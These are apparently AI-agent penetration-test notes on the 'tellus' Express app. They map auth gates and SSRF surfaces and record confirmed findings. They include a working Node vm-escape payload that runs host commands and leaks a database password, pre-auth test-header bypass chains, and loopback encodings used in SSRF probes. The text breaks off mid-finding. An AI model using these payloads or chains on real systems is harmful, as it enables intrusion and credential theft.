97adf0.title: tellus route map
97adf0.content:
Full route inventory + middleware chain for tellus saved to /workspace/.source-aware/route-map.md.

Key structure:
- Bootstrap: src/server.ts (~2219 lines); order: helmet → 10mb JSON → timeout → /api patSecurityGate → requestLogger → globalAuth (F-01 fix, boot-asserted) → securityContext → routers.
- Two auth gates: patSecurityGate (tellus_pat_* scope map) then globalAuth() (Keycloak RS256 JWT via JWKS; cookie fallback; test-auth bypass). Boot-time assertions refuse start if either is missing.
- MOST routes rely on globalAuth only; role authz is opt-in per-route (dataPlaneGuard / requireOntologyWrite / requireOntologyAdmin / authorizeRoles).
- Routes with NO route-level authz beyond globalAuth: POST /api/v1/sql, /api/v1/audit.
- /api/v1/workspaces is allowlisted in globalAuth but has NO mount — stale entry.
- Quiver at /quiver/api/v1 has its OWN per-route auth + QUIVER_ALLOW_TEST_AUTH=1 bypass.
- Connectivity, functions, code-repos, code-assistant, transforms, templates use "two-layer" pattern: globalAuth allowlist prefix + per-router requireXAuth that in production re-verifies JWT/PAT.
- bulkActions.ts NOT mounted (only apply/applyBatch have ack budget).

e9c2d1.title: tellus auth model
e9c2d1.content:
# Tellus auth model (white-box)

## Authentication
- JWT: Keycloak JWKS RS256, issuer allowlist [KC_ISSUER, localhost:8086/realms/R, keycloak:8086/realms/R]. Config: KEYCLOAK_URL, getKeycloakRealm().
- Credential surfaces (first match wins in globalAuth): Bearer JWT → TELLUS_TOKEN httpOnly cookie → PAT (patSecurityGate resolves + scope-checks) → test bypass.
- PAT: tellus_pat_*; resolved by TellusAuthService.resolvePat; per-path scope via services/patScopeMap.ts; cannot mint another PAT; superadmin ops denied to PATs (audit attribution).
- tellus_enroll_* bearer locked to two passkey-enroll paths only.

## Authorization
- requireSuperAdmin → realm role `tellus-superadmin`; PATs denied.
- requireOntologyWrite → ontology-admin | ontology-editor; requireOntologyAdmin → ontology-admin. PATs pass (scope already enforced upstream).
- authorizeRoles(...) → project_members table role check.
- requirePermission(operationId) → gatekeeperService.evaluate(principalId, operationId, resourceRid).
- cbac → policy engine (services/security/cbacPolicy) per-resource.
- securityContext → failures CLOSED. marking claims from JWT (markings claim or marking:* roles); groups claim + non-marking roles → CBAC. `tellus-superadmin` → markingBypass=true. Principal with `iss === TELLUS_INTERNAL_ISSUER` → systemPrincipal → match-all filter.

## Env-var toggles that weaken auth (all refuse-boot in production via assertNoTestAuthInProduction + executionPolicy guard)
- TELLUS_TEST_HOOKS=1 → globalAuth X-Tellus-Test-Auth header + Bearer test-auth: bypass, roles from header VERBATIM (privesc to tellus-superadmin in non-prod).
- CODE_REPOS_TEST_AUTH=1 → requireCodeReposAuth honors X-Tellus-Test-Principal; localhost fallback gives cypress-admin UUID + tellus-superadmin.
- CODE_ASSISTANT_TEST_AUTH=1 → code-assistant bypass (fail-closed on unset NODE_ENV).
- QUIVER_ALLOW_TEST_AUTH=1 → quiver x-test-user bypass.
- FUNCTION_EXECUTION_TRUST_MODE=open-development → bypasses publish gate (refused in prod; falls back to trusted-authors-only).
- FUNCTION_TRUSTED_AUTHOR_IDS → legacy env allowlist for publish (deprecated, audited as decision_source=env_allowlist).
- CONNECTIVITY_EGRESS_ALLOW_RESERVED → turns OFF SSRF reserved-target guard; assertConnectivityPosture fatal in prod unless CONNECTIVITY_ALLOW_RESERVED_IN_PRODUCTION=1 (warn).
- Live .env (dev): NODE_ENV=development + TELLUS_TEST_HOOKS=1 + CODE_REPOS_TEST_AUTH=1 → all three bypasses ACTIVE.

## Superadmin
- Defined ONLY as `tellus-superadmin` Keycloak realm role (middleware/requireSuperAdmin.ts TELLUS_SUPERADMIN_ROLE). PATs cannot hold it. Used by requireRole as universal pass and by securityContext as markingBypass.

30554f.title: tellus live surface
30554f.content:
# tellus live surface (Phase A/C results)

**Base:** `http://host.docker.internal:3000/` — Node/Express "Ontology Engine" v0.3.0, envId `tellus-dev`, NODE_ENV=development (per docker-compose.override). Reachable from the sandbox.

## Fingerprint
- `/health` (200, unauth): `{"status":"healthy","database":"connected","environmentId":"tellus-dev"}`
- `/health/ready` (200, unauth): probes postgres/s3/temporal latencies
- `/health/detailed` (200, unauth): memory + db status; **exposes process memory & internals** — info disclosure worth reporting
- `/api/docs` (200 unauth): HTML docs page (~9KB). Scrape for full endpoint list.
- `/api/metrics` (200 unauth): **Prometheus exporter 28KB, all internal metric names exposed** (e.g. `tellus_idempotent_replay_total`) — info disclosure.
- `/metrics` → 401 (interesting split: `/api/metrics` bypasses the auth gate while `/metrics` doesn't).
- Everything else under `/api/**` → 401 `{"errorCode":"UNAUTHORIZED"}` until Bearer JWT.

## No-auth surface (confirmed reachable without any token)
- `GET /health`, `/health/ready`, `/health/detailed`
- `GET /api/docs`
- `GET /api/metrics` (prometheus dump)

## Route family (from src/server.ts mounts, :3000 live)
- `/api/v1/ontology/:ontologyId/objectTypes` (+properties, branches, groups, functions, explorations, exports, geo, governance, purposes, migrations, comparisons, summary)
- `/api/v1/actions` (validate, batch), `/api/v1/audit`, `/api/v1/automations`, `/api/v1/notifications`
- `/api/v1/datasets` (foundry v1 + datasetRouter + dataPreview), `/api/v1/projects`, `/api/v1/projects/:pid/folders`, uploads
- `/api/v1/code-repositories`, `/api/v1/jemma`, `/api/v1/functions/admin` (function-publish grants)
- `/api/v1/connectivity`, `/api/v1/funnel`, `/api/v1/workshop`, `/api/v1/code-assistant`, `/api/v1/templates`, `/api/v1/scaffold`, `/api/v1/pipelines`, `/api/v1/users/me/favorites`, sql router, charts
- `/api/v2/ontologies/:ontology/{objects,media,links,actions,objectSets,oms,attachments}`
- Real ontology id: `00000000-0000-0000-0000-000000000001` (uuid the router parses); UI alias `default` also accepted and auto-mapped.

## Data volume (sampled with admin token)
- 53 objectTypes. Heavy types: `QaRwBkLoanApplications` (132 rows), `QaRwIremboCitizens` (50), `QaRwBkCustomers` (100), `OlivierOrder44` (746), plus QaRw* (Rswitch/Irembo) and Fast/Slow/Reset Probe fixtures.
- 36 datasets; 54 projects (seeded over multiple test runs).

## Resource IDs harvested (for IDOR chains)
- Ontology: `00000000-0000-0000-0000-000000000001`
- ObjectTypes: `FastProbe1787015060` id `bf2cdf97-9cab-4296-9bc8-f713d63c0838`, `SlowProbe1787015010` id `3fd31c95-9f42-43fe-b66b-b90aaa562878`
- Object RIDs: `ri.tellus.main.object.5544e783-2090-4efe-aefb-45457e1be1c4` + `2922c5ab-f6f3-438d-aeea-5213532ee81d` (QaRwBkLoanApplications), `ri.tellus.main.object.c1c6d1c2-c591-4328-a90c-d77ef2e797ac` (QaRwIremboCitizens), `ri.tellus.main.object.d294deac-66c1-40a6-b471-39d158418ffb` (OlivierOrder44)
- Projects: `448e8d04-0df6-47a0-8db4-218c11b49dc6` (owner `4f0becdd-db36-4b81-9aee-45491...`), `4ffbd424-9347-4395-8ca4-0cca439c6938`, `a9cac1ef-7e3f-4a28-821f-df4916c45c92`
- Dataset: `ace3430a-b4aa-4902-a62c-b32933940223` (`stage-delay-1787015060`, csv, 3 rows)

## Oddities
- Authorization model: viewer (no admin roles, marking:PUBLIC only) reads the same objects/datasets/projects that admin sees → shared ontology, CBAC gates by markings; cross-user separation minimal at this layer. IdOR should target user/org-scoped resources (uploads, autosave snapshots, notifications, favorites, owner-enforced projects, function publish grants).
- Occasional curl `000` (Caido hiccup) mid-loop — retry before concluding an endpoint is down.
- `/api/v1/users/me` → 404 (route doesn't exist).

fac450.title: tellus injection surfaces
fac450.content:
# Tellus — raw SQL / injection surfaces

## Template-interpolated knex.raw (candidates for SQLi only if identifier/value is request-controlled)
- services/searchService.ts:708 — `q2.whereRaw(\`${column} ILIKE ? ESCAPE '\\\\'\`, [p])` — `${column}` is a JS-interpolated IDENTIFIER. Caller-controlled if reachable from req body. Values are bound; only the column name is concatenated. Verify where `applyTokenFilters(qb, column)` is called with user input. Token values themselves bound as `?`.
- services/folderService.ts:187 — `orderByRaw(\`?? ${safeSortOrder} NULLS LAST, id ASC\`, [sortBy])` — `${safeSortOrder}` is a SANITIZED DIRECTION (wrapped). Verify the sanitization in the enclosing file (likely ASC/DESC allowlist). Direction injected by concatenation — check guard.
- Any `.raw(\`...\${expr}...\`)` not matched here: live grep during vuln-testing pass.

## whereRaw/orderByRaw with interpolations
- services/developerConsole/developerConsoleService.ts:2944 — `whereRaw('lower(name) like ?', [`%${q}%`])` — value bound; SAFE.

## Furnace SQL (POST /api/v1/sql) — user-supplied SQL string against DuckDB snapshot
- routes/sql.ts:33 — body `{ ontologyId, sql }` → services/furnaceSqlService.ts → DuckDB.
- Denylist approach (NOT allowlist): rejects first-keyword ts in {pragma,set,attach,load,install,...}; executed against DuckDB. Risk: keyword-bypass (case/comment/CTE/EXPLAIN), DuckDB extensions (read_csv, httpfs, sqlite_attach, parquet scanner on file paths),statement timeout. Route has NO route-level authorize — only globalAuth. High-value test target.

## Command-spawn surfaces (not shell-interp; execFile/spawn with args.array — injection unlikely but traversal if argument unsanitized)
- services/zipUploadService.ts — `execFile('unzip',['-l',zipPath])` (list) and `execFile('unzip',['-o','-d',targetDir,zipPath])` (extract). zipPath comes from multer temp disk location (trusted); entry names walked manually with resolved-path prefix check — GOOD (not the classic unzip-symlink/write proxy; relies on readdir+walk, not unzip -o traversal semantics). Walk logic `resolved.startsWith(path.resolve(rootDir))` — prefix-collision possible if rootDir is a prefix of a sibling path (unlikely; tempDir is random-hex sibling of file.path).
- services/ontology-bindings/osdk-regen.ts — spawn(process.execPath, [scriptPath]).
- services/pipelines/icebergSidecar.ts — spawn(PYTHON_BIN, [SIDECAR_PATH]) and spawnSync(PYTHON_BIN,["-c","import pyiceberg"]).

## CSV / file-format importers (parser-level; check for formula/CSV injection on export, or XXE if any XML is parsed)
- csv-parse used by routes/dataPreview.ts, services/uploadService.ts, services/datasetService.ts, services/reindexService.ts, services/transformService.ts, services/fileScannerService.ts, services/advancedPreviewService.ts, services/deploymentService.ts, services/datasetDatasourceService.ts, services/datasets/uploaded-dataset-reader.ts.
- adm-zip + execFile unzip both in tree — zipUploadService is the locus.

## NoSQL/DuckDB/S3 query builders worth reviewing
- DuckDB furnace: above.
- OpenSearch/Elasticsearch query builders: searchService.ts, search route. Check filter construction is parameterized (it is — `whereIn`+`orderBy` used correctly elsewhere).
- Iceberg/PyIceberg: via sidecar, not direct SQL.

2b4de8.title: tellus file ops surfaces
2b4de8.content:
# Tellus — file upload / path / archive surfaces

## Multer upload points (disk-staged)
1. routes/links.ts:70-93 + :882 — `POST /:apiName/upload`
   - diskStorage dest = `process.cwd()/data/join_tables`; filename = `${Date.now()}-${file.originalname}`  → ORIGINAL NAME is concatenated verbatim into the on-disk path (no sanitization). Multer will not traverse (basename within configured dir), but file.originalname containing `../` would be placed INSIDE join_tables as a strange name; check downstream readers that use req.file.originalname / path.join on it.
   - 5GB limit; csv-only filter (mimetype OR extension).
2. services/uploadService.ts:configureMulter — sanitized safeOriginal (`[^a-zA-Z0-9._-] → _`), dest getUploadDir(); csv/json/jsonl only.
3. foundryUploadService.ts:211 — disk-staged multer → S3 streaming.

## Zip / archive extraction
- services/zipUploadService.ts — unzip via execFile (trusted zipPath from multer); MANUAL walker with `resolved.startsWith(path.resolve(rootDir))` traversal check and `entry.name.startsWith('.')` skip; extension allowlist {.csv,.tsv,.txt}; 1GB uncompressed cap. Files re-keyed to `${Date.now()}_${rand}_${entry.name}` → S3 via buildObjectKey. The `entry.name` IS used verbatim in objectKey as `uniqueName` — note prefix-collisionless but original-name characters flow into S3 metadata/keys; probe Unicode/tab/newline in entry names for CSV-formula-injection-on-open or downstream consumption.
- adm-zip available in node_modules — grep YOUR route for any second unzip path.

## Presigned / storage surfaces
- buildObjectKey(projectId, parentFolderId, uniqueName) in services/storageService.ts — path components from caller-controlled projectId/folderId. Confirm these IDs are server-validated (UUID) and not reflected into the final S3 key raw. Check storageService for presigned URL generation.

## Importers / preview readers
- csv-parse, uploaded-dataset-reader, fileScannerService, advancedPreviewService, deploymentService, datasetDatasourceService, transformService, datasetService, reindexService.

## Link-join table import (LT-B1) — 5GB csv upload → Postgres join table; biggest single staged-file path.

a3ab07.title: tellus SSRF surfaces
a3ab07.content:
# Tellus — SSRF surfaces

## Connectivity (highest priority — user-configurable outbound)
- POST /api/v1/connectivity/connections/test-config — pre-creation probe of ARBITRARY host:port from request body. Reserved-target guard in connectors/postgresql/egress.ts (isReservedTarget: loopback, RFC-1918, 169.254.0.0/16 incl. cloud metadata, plus DNS-rebind resolve-and-recheck). Opt-out via CONNECTIVITY_EGRESS_ALLOW_RESERVED. Rate-limited.
- POST /api/v1/connectivity/connections/:rid/test — same against persisted connection.
- All /connections CRUD — host + credentials are user-controlled; connectivity:write scope.
- GET /connections/:rid/discovery/* — catalog/schemas/tables/columns/primary-keys/imported-keys/preview — runs SQL against user-specified host.
- POST /connections/:rid/cdc/preflight + cdc/streams — preflight probes.
- Webhooks: POST /webhooks/:webhookRid/{test,execute} — outbound POST to user-configured URL. See webhooks/executor.ts (egress guard, base64 data URL handling at :497).
- /connections/:rid/secrets + /credentials/issue + /internal/credentials/unwrap — credential vault + workload-JWT-only unwrap (allowlisted globalAuth).

## Other outbound traffic influenced by request/env
- services/aiEngine/client.ts (LLM endpoint → codeAssistant features) — prompt-template-driven requests.
- services/keycloakAdminService.ts + routes/tellusAuthV1.ts — admin operations against Keycloak URL from env.
- services/webhookSafeTransport.ts — hosts v4/v6/mapped-v6 check before fetch; egress-hardened.
- services/oss/embeddingProvider.ts — embedding provider URL (env).
- services/quickwit, funnel/clickhouseBootstrap, funnel/lakekeeperClient, funnel/temporal/activities, pipelines/{flinkAdapter,trinoAdapter,icebergSidecar}, quiver/compute/mat/sparkMatAdapter — all outbound on fixed infra hostnames from env; not request-controlled, but part of attack surface.
- Presigned S3 URL generation in storage/foundryUploadService — outbound SDK calls.

## Environment knobs that DISABLE SSRF guard (fatal at boot in prod unless opted-in)
- CONNECTIVITY_EGRESS_ALLOW_RESERVED — disables reserved-target guard.
- CONNECTIVITY_ALLOW_RESERVED_IN_PRODUCTION=1 — explicit prod opt-in (warn).
- Live .env on this dev stack sets neither; boundary active.

72a64e.title: tellus Functions/Automate executor trust boundaries
72a64e.content:
# Tellus — Function publish → execute trust boundary

## The boundary is EXPLICITLY NOT security-hardened
- src/services/functionExecutor.ts header: "Worker threads + `vm` is NOT a security boundary". Known escape classes exist. Mitigations listed: worker thread, V8 CPU timeout, old-space cap, env whitelist, require() shim, publication import-rejection, no fs/net API in sandbox.
- Full isolation (container/microVM, seccomp, default-deny egress) is the declared target; current code is the seam.

## Publish is the only trust gate
`src/services/functions/executionPolicy.ts` — authorizePublish(db, input) with 4 admission paths evaluated in order:
  a. Keycloak role FUNCTION_PUBLISH_ROLE (default "function:publish") — global publish right
  b. Active row in function_publish_grants matching local users.id OR Keycloak sub, scope global or repository — superadmin-managed via /api/v1/functions/admin/function-publish-grants
  c. FUNCTION_TRUSTED_AUTHOR_IDS env allowlist (deprecated fallback; audited; empty = admit nobody)
  d. FUNCTION_EXECUTION_TRUST_MODE=open-development (refused in prod, falls back + logs)

Every decision (allow AND deny) is written to function_publish_audit_log; if the audit WRITE fails on an allow, decision flips to deny. Fail-closed on DB unavailability.

## Invocation flow (publish request → sandbox)
1. `POST /api/v1/code-repositories/:rid/tags` (services/codeRepository/admin/routes.ts:2103) OR `POST /api/functions/:repositoryRid/versions` (services/functionsRegistry/admin/routes.ts:583)
2. Both call authorizePublish → audit
3. Transpiled CommonJS artifact is stored (immutable). Invocation contract recorded: legacy-object-envelope-v1 OR typescript-v2-positional-v2; signature hash sha256 pinned.
4. Execution via functionRuntime.buildSandboxCallArgs → FunctionExecutor (WorkerPoolFunctionExecutor, worker_threads+vm). Executor boundary documented in functionExecutor.ts. Contract branching ONLY on persisted invocation_contract.
5. Legacy contract disabled when FUNCTION_LEGACY_CONTRACT_DISABLED=true (422).
6. Per-effect artifact pinning: resolved_function_semver + resolved_artifact_sha256 + invocation_contract + signature_hash pinned on first execution; retries re-execute same artifact.

## GAPS / probes for later validation
- Worker pool exposed to authorized publishers — a publish grant + any code → code exec INSIDE API container. File this as a reachability chain if unauthorized/grantless publication is possible or if open-development can be coerced on.
- No egress guard on `vm` sandbox (no network exposed at the vm API, but known vm escapes bypass any such restriction easily).
- Env whitelist prevents exfil of DB creds from process.env; test whether OTHER in-process state (e.g., parent thread heap — worker_threads shares isolate but separate heaps) is reachable.
- Publish authorization IS auditable + role-based; treat published-code execution as the threat to model, not publish itself.

c9bf9d.title: tellus auth-bypass evidence (AuthBypassAgent)
c9bf9d.content:
All pre-auth from the sandbox against http://host.docker.internal:3000 — authenticated principal chain is pre-auth reachable.

PREREQ: Caido proxy sits loopback-adjacent to the app (app sees req.socket.remoteAddress as ::ffff:127.0.0.1). Live .env has CODE_REPOS_TEST_AUTH=1, TELLUS_TEST_HOOKS=1, NODE_ENV != production.

## Finding A — globalAuth test-auth bypass is remote-reachable and grants arbitrary roles
src/middleware/globalAuth.ts:436-470 ("1b") and 501-540 ("3b") honor X-Tellus-Test-Auth / Bearer test-auth: with NO localhost check. Both returned 200 on /api/v1/ontology/default/objectTypes with tellus-superadmin roles. Unlike the code-repos fallback, this path is NOT restricted to loopback. Purely gated on NODE_ENV!='production' + TELLUS_TEST_HOOKS=1.

## Finding B — functions/code-repos two-layer auth collapses to pre-auth superadmin via proxy-adjacent loopback
Chain: globalAuth allowlists /api/v1/functions*, /api/v1/code-repositories*, /api/v1/transforms*, /api/v1/templates*, /api/v1/code-assistant* (globalAuth.ts:66-109) → requireCodeReposAuth (principal.ts:161-189) sees isLocalhost(req)==true (socket peer is the loopback-adjacent Caido proxy) and CODE_REPOS_TEST_AUTH=1 → applyHeaderPrincipal(DEV_FALLBACK_PRINCIPAL) → req.codeReposPrincipal = {userId 53cf9bcf-4c20-4aed-83f4-3c7e405453b4, roles [...,"tellus-superadmin"], source:"test"}.

Proven pre-auth (no Authorization, no X-Tellus-* headers) from sandbox:
- GET /api/v1/functions/admin/function-publish-grants → 200, returns grant rows
- GET /api/v1/functions/admin/function-publish-audit-log → 200, returns audit rows
- GET /api/v1/code-repositories → 200, lists repos
- POST /api/v1/functions/admin/function-publish-grants body {"subjectType":"local_user","subjectId":"deadbeef-...","scopeType":"global","reason":"strix test"} → 201 created grant id 0267f04d-54e6-42f1-a70d-4b8c70b11e1d grantedBy 53cf9bcf... 
- Same endpoint with a REAL viewer-only Bearer token → also 200 (role check happens after principal binding; viewer can't be downgraded by fallback because upstream JWT path wins, but pre-auth bypass is the real issue).

## Finding C — pre-auth publish grant ⇒ code publication (all pre-auth)
Full loop open pre-auth: POST /api/v1/code-repositories → PUT drafts/commit → POST /:rid/tags (authorizePublish reads MY pre-auth-made grant) → POST /:rid/functions/invoke. The Functions sandbox runs arbitrary JS in worker_threads+vm (functionExecutor.ts header explicitly says NOT a security boundary). inlineSource bypass: POST /:rid/functions/invoke with body {"apiName":"helloWorld","inlineSource":"module.exports=(async()=>{return ...})"} executed — no commit needed for preview execution. Sandbox require() blocked from Node builtins ("only the Ontology SDK is available"), so this stops at in-sandbox JS exec — but the publish grant management vulnerability (B) and the publish capability (C) stand on their own as superadmin-equivalent pre-auth access.

## isLocalhost is not directly spoofable
src/services/codeRepos/middleware/principal.ts:68 uses req.socket.remoteAddress (not req.ip/XFF). Express trust proxy = 1 hop (server.ts:273) — that only affects req.ip. RemoteAddress comes from the TCP layer. The bypass works because the Caido proxy terminates client TLS and re-connects to the app from a loopback-adjacent socket — deployment topology bug, not header spoof.

## assertNoTestAuthInProduction check
src/utils/testAuthGate.ts: prevents flags in production IF NODE_ENV==='production'. But if .env ever ships NODE_ENV unset (Express default: development), production would still honor bypass — the gate treats unset as development. Deployment dependency: relies on NODE_ENV never being left unset.

17b389.title: Unauth info-disclosure findings — system health, metrics, OpenAPI spec
17b389.content:
# Unauthenticated information-disclosure findings (InfoDisclosureAgent verdicts)

All endpoints below confirmed reachable with NO token from the sandbox via Caido. Base `http://host.docker.internal:3000`. App mounted `app.use(healthRouter)` at root, `setupSwagger(app)` at ~src/server.ts:1384, and `app.get("/api/metrics", ...)` at src/server.ts:731 all with no auth middleware; they bypass auth because `src/middleware/globalAuth.ts` allowlists them.

## REPORTABLE — Unauth system status endpoints leak infra + business-schema inventory
- `GET /api/v1/system/health` → 25,161 bytes unauth: PostgreSQL version (16.14), per-table row counts (8 core tables), live OpenSearch cluster (clusterName `docker-cluster`, node count), all **80 index names + per-index document sizes/counts**, full **121 object-type inventory** with apiName + propertyCount + objectCount + lastIndexed + indexStatus, link/action type counts, uptime, version. Object-type names leak the client's business domains: `CustomsDeclaration` (Rwanda RRA customs per SECURITY.md), `TaxReturn`, `Taxpayer`, `QaRwBk*Loan/Customers/Collateral/CreditDecisions` (Rwanda Banque Kigali), `QaRwRswitch*` (R-Switch payments), `QaRwIrembo*` (Irembo gov e-services), plus probe/fixture type names.
- `GET /health/detailed` → process memory footprint (`used 16292 MB / total 16384 MB`), DB reachability, version, uptime → exploit-staging intimation.
- Root causes: all these paths sit behind the **globalAuth allowlist** at `src/middleware/globalAuth.ts:163-164` (`/api/docs*`) and appropriate paths for health/metrics (`/health*` at line 147; `/api/v1/system/*` matched via the health prefix). `app.use(healthRouter)` at src/server.ts:1285 mounts `health.ts` at root with no route-level auth.

## REPORTABLE — Unauth full OpenAPI spec
- `GET /api/docs/spec.json` → 616,426 bytes, 612 paths incl. the full superadmin user-management block (`/api/v1/auth/admin/**` — create/delete/enable users, enable/disable MFA wipe, invite flow, roles/members CRUD, OAuth app registration, settings read/write) and publish-grant/audit/admin ops. Most entries are auto-generated stubs (no request-body schemas), but it is a complete adversary route-map of privileged functions.
- Root cause: `src/middleware/globalAuth.ts:48-52` explicitly documents "Publicly readable by design" and line 164 allowlists `/api/docs*` (including spec.json). `src/docs/openapi.ts:2980/2985` mounts `/api/docs/spec.json` and `/api/docs` with no auth; `app.use(healthRouter)` and `setupSwagger(app)` at src/server.ts:1384 run before notFoundHandler. Org docs (SECURITY.md, AUDIT_CONTRACT.md) do NOT require metrics/docs be public; only AUDIT_CONTRACT.md lists `/api/metrics` as infra.
- The same allowlist entry also exposes `GET /api/docs` (Swagger UI HTML) which loads spec.json unauth.

## REPORTABLE — Unauth Prometheus metrics surfaces (3 paths)
- `GET /api/metrics` → 30KB prom-client dump: egress-guard reasons, connectivity pool counts, worker lease metrics, route-level RED series.
- `GET /api/v1/pipelines/metrics` and `GET /api/v1/funnel/metrics` → split surfaces with object-type-name labels: `tellus_sql_query_duration_seconds{object_type="QaRwBkLoanApplications"}`, `funnel_dispatch_pending_age_seconds`, `pipeline_health_check_failures_total`, `tellus_index_name_missing_tenant_total`, etc. Labels leak production object-type names and query volumes.
- Root cause: `src/middleware/globalAuth.ts:36-38` says "Scrape targets are internal-only (network isolation, not JWT)" and line 150-152 explicitly allowlists all three. K8s in prod presumably NetworkPolicies these paths, but the app itself has no defense — anyone with network reach to :3000 scrapes them.

## NOT REPORTABLE (intentional public, no restricted data)
- `/health`, `/health/ready`, `/api/v1/health`, `/api/v1/system/liveness`, `/api/v1/system/readiness` — liveness/readiness probes; trivial status-only. `/api/docs` HTML alone is a UI shell (content comes from spec.json; covered above).

## BONUS code bug (no report — no security impact)
- `src/routes/systemHealth.ts:329/345/359` mounts `/api/v1/system/{health,readiness,liveness}` on a shared router that is attached at root, so the handlers point at `/api/v1/system/health` etc. as full paths — but `health.ts` bind the SAME routes first at src/routes/health.ts:413/434/448. systemHealth.ts handlers are dead code (duplicate, unreachable). Dead code with zero runtime impact.
- Dead allowlist stale entry `src/middleware/globalAuth.ts` allowlists `/api/v1/workspaces*` but no router is mounted there (route-map confirmed: 404) — harmless dead rule.

## Evidence captures
Saved to `/workspace/.info-disc/`: `health-detailed.json`, `metrics.txt`, `docs.html`, `spec.json` (616KB), `system-health.json` (25KB), `pipelines-metrics.txt`, `funnel-metrics.txt`.

777e78.title: CONFIRMED RCE: legacy ontology functions route → host command exec
777e78.content:
Route POST /api/v1/ontology/:ontologyId/functions  + /:apiName/versions + /:apiName/invoke (src/routes/functions.ts, mounted server.ts:1293). ANY authenticated user (viewer cypress@) can register arbitrary sourceCode with NO authorizePublish gate (the gate only exists on /api/v1/functions/:rid/versions + /api/v1/code-repositories/:rid/tags). Executed by runSandboxed (src/services/functionRuntime.ts) — in-process Node `vm` in the MAIN API event loop.

ESCAPE: sourceCode `module.exports=function(){const c=this.constructor.constructor("return process")();const cp=(c.mainModule?c.mainModule.require:c.constructor("return require")())("child_process");return cp.execSync("id").toString();}` RETURNS host output:
`uid=501(olivierhabimana) gid=20(staff) ... Olivier-HABIMANA.local` and leaks c.env.PGPASSWORD=tellus123, POSTGRES_URL.

Chain: low-priv auth → register function (no gate) → invoke → vm escape via this.constructor.constructor → require('child_process') → arbitrary command exec as API user on developer macOS host. PoC user: viewer cypress@tellus.local. This bypasses every documented mitigation (worker_threads pool, env whitelist, require shim) because runSandboxed shares the host process heap and `this` is the host global proxy.

Related finding 2 (separate): unauthenticated publish via dev test-auth fallback on /api/v1/functions/:rid/versions (CODE_REPOS_TEST_AUTH=1 + pre-seeded global grant for DEV_FALLBACK_PRINCIPAL 53cf9bcf). Reported by child 804f13b0.

6e7534.title: SSRF verdict matrix — tellus connectivity
6e7534.content:
## Validated verdicts (live :3000 + source)

### CONFIRMED findings (report-worthy)
1. **[::1] canonicalisation bug → permanent mismatch between REST-domain allowlist and executor target host.** Connection creation normalises baseUrl host to `::1` (schema `z.string().min(1)` accepts it), but executor.ts:706 `assertConnectionAllows` compares whatwg-normalised `url.hostname` = `[::1]` (bracketed) verbatim against allowlist entry host `::1` → EGRESS_POLICY_BLOCKED. A connection whose only intended target is IPv6 loopback can NEVER execute a webhook. Live: conn `ri.magritte.main.source.9eb26fd3-...` allowlist `{host:"::1",port:9000}` → test webhook to `https://[::1]:9000/...` returns `EGRESS_POLICY_BLOCKED … does not allow [::1]:9000`. Same affects any IPv6 literal baseUrl (fc00::/7, fe80::/10, mapped-v6).
2. **Internal port/service mapping via test-config oracle** (defense weakness, not guard bypass): even with CONNECTIVITY_EGRESS_ALLOW_RESERVED=localhost,127.0.0.1/8,::1 set (dev default), an authenticated user with `connectivity:test` scope can distinguish closed-port (`502 JdbcConnectFailed`), open-port-non-PG (`500 InternalError "Connection terminated unexpectedly"`), open-PG (`401 JdbcAuthFailed`), and blackhole (`timeout 5s`) on loopback. Validated: 3000=api(app, 500), 3001=FE(500), 5432=pg(401 JdbcAuth), 7233=temporal(500), 9000 minio/8086 keycloak blackholed-or-pgq-timeout. No data read — oracle is an internal service fingerprint, not content disclosure.

### CONFIRMED BLOCKED (guard held)
- test-config: 10.0.0.5, 169.254.169.254, metadata.google.internal, 2852039166 (dec), 0xa9fea9fe, [::1], ::1, [::ffff:127.0.0.1], [::ffff:7f00:1], 0:0:0:0:0:0:0:1, localhost., LOCALHOST, host.docker.internal (unresolvable inside pod), keycloak (unresolvable) all blocked fast (0 error-class EgressBlocked). 2130706433 / 0x7f000001 / 127.1 / 0x7f.0.0.1 / 0177.0.0.1 pass guard (Node dns.lookup treats as loopback literal — matches env CONNECTIVITY_EGRESS_ALLOW_RESERVED=127.0.0.1/8) → fail later on PG protocol, NOT a bypass.
- executor.ts: `assertConnectionAllows` (exact host+port match against approved allowlist) AND `assertEgressUrl` (static forbidden-IP literals incl. 127.x, 169.254.x, ::1, fe80, ::, 0.x AND httpsRequired in prod) AND `assertDnsDestinationAllowed` (dns.lookup all:true + isPrivateOrSpecialAddress incl. RFC1918/10.x/192.168/169.254/224+, verbatim) AND pinned `lookup` callback → connect to validated IP. Triple-stacked. No path found from an arbitrary-webhook control to an internal IP/hostname the operator did NOT explicitly allowlist.
- Redirect to loopback blocked (executor.ts: `REDIRECT_BLOCKED` on 3xx — no re-lookup). Legacy `deliverOne` (`actionWebhooks.ts`) DOES follow redirects via global fetch and only string-guards the initial URL via assertEgressForConfig; BUT it is F9-deprecated, and reaching it requires the editor/admin to author an ActionType with side_effect.webhooks[] pointing at the redirector — that is an operator-trusted path. Flagged to fix, not exploitable as viewer.

### Not applicable here
- Cloud metadata (169.254.169.254) is blocked at every layer and is not reachable from the Docker-Desktop pod anyway.
- DNS rebinding: pinned lookup (executor.ts requestPinnedDestination + pool.ts assertEgressResolved returning one pinned IP used as connect host with TLS servername=original host) mitigates TOCTOU. No public-DNS-controlled hostname available inside the pod's resolver to demo.

## Files (source anchors)
- executor.ts: `assertConnectionAllows` ~L384-403 (bug #1), `assertDnsDestinationAllowed` ~L353, `requestPinnedDestination` ~L645, `executeCall` ~L776-940, `REDIRECT_BLOCKED` ~L996
- egress.ts: `isReservedTarget` ~L230, `assertEgressForConfig` ~L251, `assertEgressResolved` ~L287 (DNS-pinned)
- webhookSafeTransport.ts: `isForbiddenIpLiteral` ~L258, `assertEgressUrl` ~L224, `DEFAULT_EGRESS_POLICY` ~L157 (httpsRequired:true, followRedirects:false, 1MiB caps)
- actionWebhooks.ts: `deliverOne` ~L98 (legacy, fetch follows redirects, string guard only, deprecated F9)
- pool.ts: `assertEgressAllowed` + `assertEgressResolved` + pinnedHost used as pg connect host with `ssl.servername = pgConfig.host` ~L180-200
- test.handler.ts: `testConfig` ~L226 (oracle; rate-limited only for unauth; auth users unthrottled unless CONNECTIVITY_TEST_RATE_LIMIT_ALL=1)

c13854.title: tellus file-ops validation — verdicts
c13854.content:
File-ops surface validation on tellus (viewer + admin tokens, live at :3000).

## CONFIRMED — filed vuln-0027 (Stored XSS / active content via attachment upload)
